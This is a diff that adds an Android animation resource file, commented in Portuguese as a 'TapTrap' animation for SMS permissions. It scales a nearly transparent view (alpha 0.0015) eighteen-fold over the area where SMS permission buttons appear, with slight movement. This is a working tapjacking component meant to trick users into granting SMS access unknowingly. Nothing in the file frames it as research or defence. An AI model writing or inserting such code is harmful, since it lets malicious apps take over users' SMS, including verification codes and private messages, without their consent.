@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Animação TapTrap específica para permissões de SMS -->
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <!-- Escalar para área de botões SMS -->
+    <scale
+        android:fromXScale="18"
+        android:toXScale="18"
+        android:fromYScale="18"
+        android:toYScale="18"
+        android:pivotX="55%"
+        android:pivotY="40%"
+        android:repeatCount="1"
+        android:duration="3100" />
+    <!-- Transparência mínima -->
+    <alpha
+        android:fromAlpha="0.0015"
+        android:toAlpha="0.0015"
+        android:repeatCount="1"
+        android:duration="3100" />
+    <!-- Movimento sutil -->
+    <translate
+        android:fromXDelta="5%"
+        android:toXDelta="8%"
+        android:fromYDelta="2%"
+        android:toYDelta="5%"
+        android:duration="3100" />
+</set>
